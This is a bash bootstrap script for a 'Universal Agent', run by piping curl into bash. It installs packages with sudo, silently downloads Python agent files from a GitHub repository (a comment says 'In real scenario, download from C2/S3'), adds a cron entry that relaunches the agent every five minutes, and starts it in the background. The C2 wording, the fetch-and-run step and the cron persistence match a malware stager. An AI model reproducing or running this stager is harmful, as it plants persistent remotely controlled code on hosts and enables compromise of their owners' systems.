#!/bin/bash
# Universal Agent Bootstrap
# Usage: curl -s http://controller/bootstrap.sh | bash

set -e

DIR="$HOME/.agent_v1"
mkdir -p "$DIR"
cd "$DIR"

echo "[*] Bootstrapping Universal Agent..."

# 1. Install Dependencies
if command -v apt-get >/dev/null; then
    sudo apt-get update -qq
    sudo apt-get install -y python3 python3-pip wget curl
elif command -v yum >/dev/null; then
    sudo yum install -y python3 python3-pip wget curl
fi

# 2. Install Python Libs
pip3 install requests psutil --user

# 3. Download Agent Code (In real scenario, download from C2/S3)
# For now, we assume these files are placed here or cat'd into existence
# We will create a self-extracting payload concept here
if [ ! -f "agent_core.py" ]; then
    echo "[*] Downloading Agent Core..."
    curl -s -L -o agent_core.py "https://raw.githubusercontent.com/jenish-prog/test-repo/main/agent_core.py"
    curl -s -L -o ai_interface.py "https://raw.githubusercontent.com/jenish-prog/test-repo/main/ai_interface.py"
fi

# 4. Persistence (Cron)
CRON_CMD="*/5 * * * * cd $DIR && python3 agent_core.py >> agent.log 2>&1"
(crontab -l 2>/dev/null | grep -v "agent_core.py"; echo "$CRON_CMD") | crontab -

# 5. Run
echo "[*] Launching Agent..."
python3 agent_core.py &
